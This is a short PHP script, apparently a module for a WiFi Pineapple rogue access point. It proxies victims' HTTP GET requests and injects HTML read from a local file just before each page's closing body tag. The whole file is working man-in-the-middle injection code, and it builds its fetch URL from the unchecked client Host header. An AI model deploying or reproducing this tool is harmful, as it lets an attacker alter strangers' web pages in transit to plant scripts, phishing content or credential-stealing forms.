<?php

// HTTPProxy version 1.0 only handle HTTP Get Request , in the next version we will handle POST requests.
 
header('Content-Type: text/html');
header_remove('Content-Type');


$url=$_SERVER['HTTP_HOST'];
$_SERVER['REQUEST_URI'];
$y=file_get_contents("http://".$url.$_SERVER['REQUEST_URI']);


// read HTML injection 

$htmlFile = fopen("/pineapple/modules/HTTPProxy/assets/HTML/htmlFile.txt", "r") ;
$htmlInjection=fread($htmlFile,10000);

echo $copy_date = preg_replace("'</body>'", $htmlInjection."</body>", $y);